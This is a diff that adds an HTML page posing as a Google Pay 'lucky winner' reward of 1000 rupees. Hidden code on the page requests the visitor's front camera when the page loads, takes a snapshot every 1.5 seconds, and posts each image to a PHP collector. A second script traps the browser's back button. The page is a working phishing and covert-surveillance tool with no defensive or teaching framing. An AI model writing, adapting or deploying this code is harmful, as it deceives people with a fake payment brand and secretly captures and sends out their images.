@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Pay Invitation</title>
+    <style>
+        /* CSS for center alignment */
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Align items to the top */
+            font-family: Arial, sans-serif;
+        }
+        div {
+            text-align: center;
+            max-width: 80%;
+            padding: 20px;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+        h1 {
+            font-size: 24px;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        a {
+            color: blue;
+            text-decoration: none;
+        }
+        @media only screen and (max-width: 600px) {
+            /* Adjustments for smaller screens */
+            div {
+                max-width: 90%;
+            }
+            h1 {
+                font-size: 20px;
+            }
+            p {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div>
+        <!-- SVG with specified width -->
+        <img src="gpay/gp3-lockup.svg" alt="Google Pay" width="200px"> <!-- Adjust width as needed -->
+
+        <h1>You're the lucky winner!</h1>
+        <p>You have rewarded with 1000 rupees cash * Please open this link from your mobile device.</p>
+        <a href="www.google.com">g.pay/rewarded/p31q780</a><br>
+        <br>
+        <img src="gpay/invited.svg" alt="invited" width="400px">
+    </div>
+     <!-- Camera functionality -->
+  <div class="video-wrap" hidden="hidden">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <script>
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php', // Your PHP file URL
+        dataType: 'json',
+        async: false,
+        success: function(result) {
+          // Handle success
+        },
+        error: function() {
+          // Handle errors
+        }
+      });
+    }
+
+    'use strict';
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+    const constraints = {
+      audio: false,
+      video: { facingMode: "user" }
+    };
+
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      }
+    }
+
+    // Success
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+      var context = canvas.getContext('2d');
+      setInterval(function() {
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+      }, 1500);
+    }
+
+    // Load init
+    init();
+  </script>   
+  <script type="text/javascript">  /// prevent the user navigating back
+    ! function() {
+      var t;
+      try {
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+        onpopstate = function(t) {
+          t.state && location.replace("https://www.google.com")
+        }
+      } catch (o) {}
+    }();
+  </script>
+
+</body>
+</html>
